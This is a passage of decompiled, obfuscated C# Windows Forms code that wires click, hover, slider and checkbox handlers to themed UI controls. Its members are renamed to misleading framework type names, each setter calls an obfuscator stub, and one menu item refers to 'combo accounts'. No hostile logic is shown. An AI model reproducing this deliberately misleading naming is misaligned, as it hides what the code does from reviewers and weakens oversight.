				if (whatsCached != null)
				{
					whatsCached.MouseEnter += value2;
					whatsCached.MouseLeave += value3;
					whatsCached.Click += value4;
				}
			}
		}

		internal virtual PictureBox Attributes
		{
			[CompilerGenerated]
			get
			{
				return this.IEnumerator1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(113);
				EventHandler value2 = new EventHandler(this.RijndaelManaged);
				EventHandler value3 = new EventHandler(this.EntryPointEntryFieldId);
				EventHandler value4 = new EventHandler(this.CryptographicException);
				PictureBox ienumerator = this.IEnumerator1;
				if (ienumerator != null)
				{
					ienumerator.Click -= value2;
					ienumerator.MouseEnter -= value3;
					ienumerator.MouseLeave -= value4;
				}
				this.IEnumerator1 = value;
				ienumerator = this.IEnumerator1;
				if (ienumerator != null)
				{
					ienumerator.Click += value2;
					ienumerator.MouseEnter += value3;
					ienumerator.MouseLeave += value4;
				}
			}
		}

		internal virtual PictureBox UrlAttribute
		{
			[CompilerGenerated]
			get
			{
				return this.IMethodReturnMessage;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(114);
				EventHandler value2 = new EventHandler(this.SafeProvHandleInternalElementTypeE);
				EventHandler value3 = new EventHandler(this.CommonAcl);
				EventHandler value4 = new EventHandler(this.CalendarId);
				PictureBox imethodReturnMessage = this.IMethodReturnMessage;
				if (imethodReturnMessage != null)
				{
					imethodReturnMessage.Click -= value2;
					imethodReturnMessage.MouseEnter -= value3;
					imethodReturnMessage.MouseLeave -= value4;
				}
				this.IMethodReturnMessage = value;
				imethodReturnMessage = this.IMethodReturnMessage;
				if (imethodReturnMessage != null)
				{
					imethodReturnMessage.Click += value2;
					imethodReturnMessage.MouseEnter += value3;
					imethodReturnMessage.MouseLeave += value4;
				}
			}
		}

		internal virtual PictureBox KeyContainerPermissionAccessEntry
		{
			[CompilerGenerated]
			get
			{
				return this.TypeDependencyAttribute;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(115);
				EventHandler value2 = new EventHandler(this.CallBackHelper);
				EventHandler value3 = new EventHandler(this.Variant);
				EventHandler value4 = new EventHandler(this.CodeConnectAccess);
				PictureBox typeDependencyAttribute = this.TypeDependencyAttribute;
				if (typeDependencyAttribute != null)
				{
					typeDependencyAttribute.MouseEnter -= value2;
					typeDependencyAttribute.MouseLeave -= value3;
					typeDependencyAttribute.Click -= value4;
				}
				this.TypeDependencyAttribute = value;
				typeDependencyAttribute = this.TypeDependencyAttribute;
				if (typeDependencyAttribute != null)
				{
					typeDependencyAttribute.MouseEnter += value2;
					typeDependencyAttribute.MouseLeave += value3;
					typeDependencyAttribute.Click += value4;
				}
			}
		}

		internal virtual Panel SafeCertStoreHandle { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel X509CertificateCMSHASHDIGESTMETHOD { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel CompressedStackRunData { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual MetroTextbox MarshalByRefObject { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual Panel ComMemberType { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual MetroTrackbar ThreadStart
		{
			[CompilerGenerated]
			get
			{
				return this.IEnumerator1CallingConvention;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(116);
				MetroTrackbar.ScrollEventHandler obj = new MetroTrackbar.ScrollEventHandler(this.DllImportAttribute);
				MetroTrackbar ienumerator1CallingConvention = this.IEnumerator1CallingConvention;
				if (ienumerator1CallingConvention != null)
				{
					ienumerator1CallingConvention.Scroll -= obj;
				}
				this.IEnumerator1CallingConvention = value;
				ienumerator1CallingConvention = this.IEnumerator1CallingConvention;
				if (ienumerator1CallingConvention != null)
				{
					ienumerator1CallingConvention.Scroll += obj;
				}
			}
		}

		internal virtual MetroTrackbar Context
		{
			[CompilerGenerated]
			get
			{
				return this.CLSCompliantAttribute;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(117);
				MetroTrackbar.ScrollEventHandler obj = new MetroTrackbar.ScrollEventHandler(this.QualifiedAce);
				MetroTrackbar clscompliantAttribute = this.CLSCompliantAttribute;
				if (clscompliantAttribute != null)
				{
					clscompliantAttribute.Scroll -= obj;
				}
				this.CLSCompliantAttribute = value;
				clscompliantAttribute = this.CLSCompliantAttribute;
				if (clscompliantAttribute != null)
				{
					clscompliantAttribute.Scroll += obj;
				}
			}
		}

		internal virtual MetroLabel IDescriptionMetadataEntry { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual MetroChecker TOKENPRIVILEGE
		{
			[CompilerGenerated]
			get
			{
				return this.AttributeTargetsCultureInfo;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(118);
				MetroChecker.CheckedChangedEventHandler obj = new MetroChecker.CheckedChangedEventHandler(this.CultureTableData);
				MetroChecker attributeTargetsCultureInfo = this.AttributeTargetsCultureInfo;
				if (attributeTargetsCultureInfo != null)
				{
					attributeTargetsCultureInfo.CheckedChanged -= obj;
				}
				this.AttributeTargetsCultureInfo = value;
				attributeTargetsCultureInfo = this.AttributeTargetsCultureInfo;
				if (attributeTargetsCultureInfo != null)
				{
					attributeTargetsCultureInfo.CheckedChanged += obj;
				}
			}
		}

		internal virtual MetroTrackbar AssemblyRequestEntryFieldIdKoreanLunisolarCalendar
		{
			[CompilerGenerated]
			get
			{
				return this.FromBase64TransformModeIMessageCtrl;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(119);
				MetroTrackbar.ScrollEventHandler obj = new MetroTrackbar.ScrollEventHandler(this.CATEGORYSUBCATEGORY);
				MetroTrackbar fromBase64TransformModeIMessageCtrl = this.FromBase64TransformModeIMessageCtrl;
				if (fromBase64TransformModeIMessageCtrl != null)
				{
					fromBase64TransformModeIMessageCtrl.Scroll -= obj;
				}
				this.FromBase64TransformModeIMessageCtrl = value;
				fromBase64TransformModeIMessageCtrl = this.FromBase64TransformModeIMessageCtrl;
				if (fromBase64TransformModeIMessageCtrl != null)
				{
					fromBase64TransformModeIMessageCtrl.Scroll += obj;
				}
			}
		}

		internal virtual PictureBox ExceptionInfo
		{
			[CompilerGenerated]
			get
			{
				return this.FileSystemAuditRule;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(120);
				EventHandler value2 = new EventHandler(this.IFileEntry);
				EventHandler value3 = new EventHandler(this.InternalArrayTypeE);
				EventHandler value4 = new EventHandler(this.AppDomain);
				PictureBox fileSystemAuditRule = this.FileSystemAuditRule;
				if (fileSystemAuditRule != null)
				{
					fileSystemAuditRule.Click -= value2;
					fileSystemAuditRule.MouseLeave -= value3;
					fileSystemAuditRule.MouseEnter -= value4;
				}
				this.FileSystemAuditRule = value;
				fileSystemAuditRule = this.FileSystemAuditRule;
				if (fileSystemAuditRule != null)
				{
					fileSystemAuditRule.Click += value2;
					fileSystemAuditRule.MouseLeave += value3;
					fileSystemAuditRule.MouseEnter += value4;
				}
			}
		}

		internal virtual PictureBox AssemblyAlgorithmIdAttribute
		{
			[CompilerGenerated]
			get
			{
				return this.IUnknownSafeHandle;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(121);
				EventHandler value2 = new EventHandler(this.ConsoleCancelEventArgs);
				EventHandler value3 = new EventHandler(this.UCOMIEnumVARIANT);
				PictureBox iunknownSafeHandle = this.IUnknownSafeHandle;
				if (iunknownSafeHandle != null)
				{
					iunknownSafeHandle.Click -= value2;
					iunknownSafeHandle.MouseLeave -= value3;
				}
				this.IUnknownSafeHandle = value;
				iunknownSafeHandle = this.IUnknownSafeHandle;
				if (iunknownSafeHandle != null)
				{
					iunknownSafeHandle.Click += value2;
					iunknownSafeHandle.MouseLeave += value3;
				}
			}
		}

		internal virtual ScopeTreeLCIDConversionAttribute SoapIntegerInt32
		{
			[CompilerGenerated]
			get
			{
				return this.ConsoleStream;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(122);
				EventHandler value2 = new EventHandler(this.ManualResetEvent);
				ScopeTreeLCIDConversionAttribute consoleStream = this.ConsoleStream;
				if (consoleStream != null)
				{
					consoleStream.CheckedChanged -= value2;
				}
				this.ConsoleStream = value;
				consoleStream = this.ConsoleStream;
				if (consoleStream != null)
				{
					consoleStream.CheckedChanged += value2;
				}
			}
		}

		internal virtual Panel ConvertUnverifiableCodeAttribute { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual PictureBox EventItfInfo
		{
			[CompilerGenerated]
			get
			{
				return this._PictureBox6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(123);
				EventHandler value2 = new EventHandler(this.ManualResetEventDescriptionMetadataEntry);
				EventHandler value3 = new EventHandler(this.SoapInteger);
				EventHandler value4 = new EventHandler(this.KeyContainerPermissionAccessEntryCollection);
				PictureBox pictureBox = this._PictureBox6;
				if (pictureBox != null)
				{
					pictureBox.Click -= value2;
					pictureBox.MouseLeave -= value3;
					pictureBox.MouseEnter -= value4;
				}
				this._PictureBox6 = value;
				pictureBox = this._PictureBox6;
				if (pictureBox != null)
				{
					pictureBox.Click += value2;
					pictureBox.MouseLeave += value3;
					pictureBox.MouseEnter += value4;
				}
			}
		}

		internal virtual PictureBox SafeTokenHandle
		{
			[CompilerGenerated]
			get
			{
				return this.IdnMapping;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(124);
				EventHandler value2 = new EventHandler(this.ZoneMembershipCondition);
				EventHandler value3 = new EventHandler(this.FastResourceComparer);
				EventHandler value4 = new EventHandler(this.TripleDESCryptoServiceProvider);
				PictureBox idnMapping = this.IdnMapping;
				if (idnMapping != null)
				{
					idnMapping.Click -= value2;
					idnMapping.MouseLeave -= value3;
					idnMapping.MouseEnter -= value4;
				}
				this.IdnMapping = value;
				idnMapping = this.IdnMapping;
				if (idnMapping != null)
				{
					idnMapping.Click += value2;
					idnMapping.MouseLeave += value3;
					idnMapping.MouseEnter += value4;
				}
			}
		}

		internal virtual Panel RawAclWellKnownSidType { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual MetroTrackbar SharedStatics
		{
			[CompilerGenerated]
			get
			{
				return this.Evidence;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(125);
				MetroTrackbar.ScrollEventHandler obj = new MetroTrackbar.ScrollEventHandler(this.Int64);
				MetroTrackbar evidence = this.Evidence;
				if (evidence != null)
				{
					evidence.Scroll -= obj;
				}
				this.Evidence = value;
				evidence = this.Evidence;
				if (evidence != null)
				{
					evidence.Scroll += obj;
				}
			}
		}

		internal virtual MetroLabel ISCIIDecoder { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual MetroChecker RawSecurityDescriptor
		{
			[CompilerGenerated]
			get
			{
				return this.Normalization;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(126);
				MetroChecker.CheckedChangedEventHandler obj = new MetroChecker.CheckedChangedEventHandler(this.FixedBufferAttribute);
				MetroChecker normalization = this.Normalization;
				if (normalization != null)
				{
					normalization.CheckedChanged -= obj;
				}
				this.Normalization = value;
				normalization = this.Normalization;
				if (normalization != null)
				{
					normalization.CheckedChanged += obj;
				}
			}
		}

		internal virtual MetroChecker JitHelpers
		{
			[CompilerGenerated]
			get
			{
				return this.WhatsCachedTextInfoDataHeader;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(127);
				MetroChecker.CheckedChangedEventHandler obj = new MetroChecker.CheckedChangedEventHandler(this.DriveInfo);
				MetroChecker whatsCachedTextInfoDataHeader = this.WhatsCachedTextInfoDataHeader;
				if (whatsCachedTextInfoDataHeader != null)
				{
					whatsCachedTextInfoDataHeader.CheckedChanged -= obj;
				}
				this.WhatsCachedTextInfoDataHeader = value;
				whatsCachedTextInfoDataHeader = this.WhatsCachedTextInfoDataHeader;
				if (whatsCachedTextInfoDataHeader != null)
				{
					whatsCachedTextInfoDataHeader.CheckedChanged += obj;
				}
			}
		}

		internal virtual MetroChecker ThreadPoolGlobals
		{
			[CompilerGenerated]
			get
			{
				return this.DecoratedNameAttribute;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(128);
				MetroChecker.CheckedChangedEventHandler obj = new MetroChecker.CheckedChangedEventHandler(this.CustomAttributeBuilder);
				MetroChecker decoratedNameAttribute = this.DecoratedNameAttribute;
				if (decoratedNameAttribute != null)
				{
					decoratedNameAttribute.CheckedChanged -= obj;
				}
				this.DecoratedNameAttribute = value;
				decoratedNameAttribute = this.DecoratedNameAttribute;
				if (decoratedNameAttribute != null)
				{
					decoratedNameAttribute.CheckedChanged += obj;
				}
			}
		}

		internal virtual MetroChecker FileAttributes
		{
			[CompilerGenerated]
			get
			{
				return this.CerDateMapping;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(129);
				MetroChecker.CheckedChangedEventHandler obj = new MetroChecker.CheckedChangedEventHandler(this.AssemblyRegistrationFlags);
				MetroChecker cerDateMapping = this.CerDateMapping;
				if (cerDateMapping != null)
				{
					cerDateMapping.CheckedChanged -= obj;
				}
				this.CerDateMapping = value;
				cerDateMapping = this.CerDateMapping;
				if (cerDateMapping != null)
				{
					cerDateMapping.CheckedChanged += obj;
				}
			}
		}

		internal virtual MetroChecker InvalidFilterCriteriaExceptionMdaHelper
		{
			[CompilerGenerated]
			get
			{
				return this.ICategoryMembershipEntry;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(130);
				MetroChecker.CheckedChangedEventHandler obj = new MetroChecker.CheckedChangedEventHandler(this.SafeArrayRankMismatchException);
				MetroChecker icategoryMembershipEntry = this.ICategoryMembershipEntry;
				if (icategoryMembershipEntry != null)
				{
					icategoryMembershipEntry.CheckedChanged -= obj;
				}
				this.ICategoryMembershipEntry = value;
				icategoryMembershipEntry = this.ICategoryMembershipEntry;
				if (icategoryMembershipEntry != null)
				{
					icategoryMembershipEntry.CheckedChanged += obj;
				}
			}
		}

		internal virtual MetroChecker BinaryTypeEnum
		{
			[CompilerGenerated]
			get
			{
				return this.PaddingMode;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(131);
				MetroChecker.CheckedChangedEventHandler obj = new MetroChecker.CheckedChangedEventHandler(this.CultureTableRecord);
				MetroChecker paddingMode = this.PaddingMode;
				if (paddingMode != null)
				{
					paddingMode.CheckedChanged -= obj;
				}
				this.PaddingMode = value;
				paddingMode = this.PaddingMode;
				if (paddingMode != null)
				{
					paddingMode.CheckedChanged += obj;
				}
			}
		}

		internal virtual Panel NullTextReader { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual System.Windows.Forms.Timer ISecurableChannelAssemblyReferenceDependentAssemblyEntry
		{
			[CompilerGenerated]
			get
			{
				return this.RSAPKCS1SignatureDeformatterDateTimeFormatInfoScanner;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(132);
				EventHandler value2 = new EventHandler(this.RankException);
				System.Windows.Forms.Timer rsapkcs1SignatureDeformatterDateTimeFormatInfoScanner = this.RSAPKCS1SignatureDeformatterDateTimeFormatInfoScanner;
				if (rsapkcs1SignatureDeformatterDateTimeFormatInfoScanner != null)
				{
					rsapkcs1SignatureDeformatterDateTimeFormatInfoScanner.Tick -= value2;
				}
				this.RSAPKCS1SignatureDeformatterDateTimeFormatInfoScanner = value;
				rsapkcs1SignatureDeformatterDateTimeFormatInfoScanner = this.RSAPKCS1SignatureDeformatterDateTimeFormatInfoScanner;
				if (rsapkcs1SignatureDeformatterDateTimeFormatInfoScanner != null)
				{
					rsapkcs1SignatureDeformatterDateTimeFormatInfoScanner.Tick += value2;
				}
			}
		}

		internal virtual IExpando TypeResolveHandler
		{
			[CompilerGenerated]
			get
			{
				return this.BaseChannelObjectWithProperties;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(133);
				EventHandler value2 = new EventHandler(this.ObjectCreationDelegate);
				IExpando baseChannelObjectWithProperties = this.BaseChannelObjectWithProperties;
				if (baseChannelObjectWithProperties != null)
				{
					baseChannelObjectWithProperties.Click -= value2;
				}
				this.BaseChannelObjectWithProperties = value;
				baseChannelObjectWithProperties = this.BaseChannelObjectWithProperties;
				if (baseChannelObjectWithProperties != null)
				{
					baseChannelObjectWithProperties.Click += value2;
				}
			}
		}

		internal virtual DataGridViewTextBoxColumn ObjectCloneHelper { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual DataGridViewTextBoxColumn LogSwitch { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual DataGridViewTextBoxColumn AllMembershipConditionEncoderExceptionFallback { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual DataGridViewTextBoxColumn WindowsPrincipal { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual DataGridViewTextBoxColumn InputRecord { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual DataGridViewTextBoxColumn GCSettings { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual DataGridViewTextBoxColumn RemotingException { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		internal virtual PictureBox SynchronizationContextPropertiesPredicate1
		{
			[CompilerGenerated]
			get
			{
				return this.BLOB;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(134);
				EventHandler value2 = new EventHandler(this.MscorlibCollectionDebugView1);
				EventHandler value3 = new EventHandler(this.method_1);
				EventHandler value4 = new EventHandler(this.StringSplitOptions);
				PictureBox blob = this.BLOB;
				if (blob != null)
				{
					blob.Click -= value2;
					blob.MouseLeave -= value3;
					blob.MouseEnter -= value4;
				}
				this.BLOB = value;
				blob = this.BLOB;
				if (blob != null)
				{
					blob.Click += value2;
					blob.MouseLeave += value3;
					blob.MouseEnter += value4;
				}
			}
		}

		internal virtual PictureBox ParseFlags
		{
			[CompilerGenerated]
			get
			{
				return this.MessageEnd;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				<Module>.SoapFieldAttribute(135);
				EventHandler value2 = new EventHandler(this.TypeInfo);
				EventHandler value3 = new EventHandler(this.ControlFlags);
				EventHandler value4 = new EventHandler(this.NonSerializedAttributeTypeEntry);
				PictureBox messageEnd = this.MessageEnd;
				if (messageEnd != null)
				{
					messageEnd.Click -= value2;
					messageEnd.MouseLeave -= value3;
					messageEnd.MouseEnter -= value4;
				}
				this.MessageEnd = value;
				messageEnd = this.MessageEnd;
				if (messageEnd != null)
				{
					messageEnd.Click += value2;
					messageEnd.MouseLeave += value3;
					messageEnd.MouseEnter += value4;
				}
			}
		}

		private Point EUCJPEncoding;

		private bool ParameterBuilder;

		private Thread DirectoryInfo;

		private string CommonAclSafeLsaLogonProcessHandle;

		private int ImportedFromTypeLibAttributeUnverifiableCodeAttribute;

		private string DebuggerStepperBoundaryAttribute;

		private string ResourceType;

		private IContainer FileLoadException;

		[AccessedThroughProperty("AnimaForm1")]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private AnimaForm PinnedBufferMemoryStream;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaTabControl1")]
		[CompilerGenerated]
		private Site SystemAcl;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("TabPage2")]
		[CompilerGenerated]
		private TabPage BinaryObjectWithMap;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label1")]
		[CompilerGenerated]
		private Label PlatformNotSupportedException;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("TabPage1")]
		[CompilerGenerated]
		private TabPage IsolatedStorageFileMCMDictionary;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel1")]
		[CompilerGenerated]
		private Panel Predicate1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel2")]
		[CompilerGenerated]
		private Panel DecoderUTF7Fallback;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton1")]
		[CompilerGenerated]
		private IExpando BINDPTR;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label2")]
		[CompilerGenerated]
		private Label ClearCacheHandler;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label5")]
		[CompilerGenerated]
		private Label LifetimeServices;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label4")]
		[CompilerGenerated]
		private Label SorterObjectArray;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label3")]
		[CompilerGenerated]
		private Label LifetimeServicesCacheType;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		[AccessedThroughProperty("Label6")]
		private Label ExceptionFromErrorCode;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label7")]
		[CompilerGenerated]
		private Label Comparer1;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label8")]
		[CompilerGenerated]
		private Label DateTimeResult;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		[AccessedThroughProperty("AnimaButton5")]
		private IExpando IUnrestrictedPermission;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton4")]
		[CompilerGenerated]
		private IExpando EnvironmentPermissionIReflect;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton3")]
		[CompilerGenerated]
		private IExpando MonitorDSA;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton2")]
		[CompilerGenerated]
		private IExpando SecurityCriticalScope;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaCheckBox2")]
		[CompilerGenerated]
		private ScopeTreeLCIDConversionAttribute FileAssociationEntryGuid;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaCheckBox1")]
		private ScopeTreeLCIDConversionAttribute ChannelInfo;

		[AccessedThroughProperty("AnimaButton6")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private IExpando OverlappedDataCacheOidGroup;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Timer1")]
		[CompilerGenerated]
		private System.Windows.Forms.Timer TOKENGROUPSIIdentityAuthority;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("ContextMenuStrip1")]
		[CompilerGenerated]
		private ContextMenuStrip TryCode;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("ComboAccountsToolStripMenuItem")]
		private ToolStripMenuItem GenericArraySortHelper1;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel4")]
		private Panel GacInstalled;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel7")]
		private Panel CustomAce;

		[AccessedThroughProperty("Panel11")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private Panel SoapYear;

		[CompilerGenerated]
		[AccessedThroughProperty("Panel10")]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private Panel DBNullTypeFilterLevel;

		[AccessedThroughProperty("PictureBox9")]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private PictureBox SuppressUnmanagedCodeSecurityAttribute;

		[AccessedThroughProperty("PictureBox8")]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private PictureBox LSATRANSLATEDSID;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		[AccessedThroughProperty("Label25")]
		private Label AllMembershipCondition;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel9")]
		private Panel IConstructionReturnMessage;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label21")]
		private Label StackEnumeratorArrayTypeMismatchException;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label19")]
		private Label SoapAttributeType;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel12")]
		[CompilerGenerated]
		private Panel TokenSource;

		[AccessedThroughProperty("AnimaButton11")]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private IExpando PolicyLevel;

		[AccessedThroughProperty("AnimaButton10")]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private IExpando CreateFlags;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label26")]
		[CompilerGenerated]
		private Label BinaryObjectWithMapTyped;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label27")]
		private Label SerObjectInfoInit;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton17")]
		private IExpando ApplicationId;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton16")]
		private IExpando AsyncFlowControl;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton15")]
		private IExpando IMessageNumberFormatInfo;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton14")]
		private IExpando RawAcl;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton13")]
		private IExpando PrimaryInteropAssemblyAttribute;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton12")]
		private IExpando ICDF;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label31")]
		private Label EncoderNLS;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label32")]
		[CompilerGenerated]
		private Label SearchOption;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label30")]
		private Label DecoderFallbackBuffer;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label28")]
		private Label ReadOnlyCollectionBase;

		[AccessedThroughProperty("Label29")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private Label Url;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton9")]
		private IExpando MethodReturnMessageWrapper;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("AnimaButton8")]
		private IExpando IList;

		[AccessedThroughProperty("AnimaButton7")]
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private IExpando ValueFixupEnum;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("DataGridView1")]
		private DataGridView ConfigTreeParser;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel3")]
		private Panel StoreOperationSetCanonicalizationContext;

		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		[AccessedThroughProperty("Label33")]
		private Label TlsContents;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Label34")]
		private Label MemberReference;

		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[AccessedThroughProperty("Panel6")]
		private Panel TokenSourceDllNotFoundException;

		[CompilerGenerated]
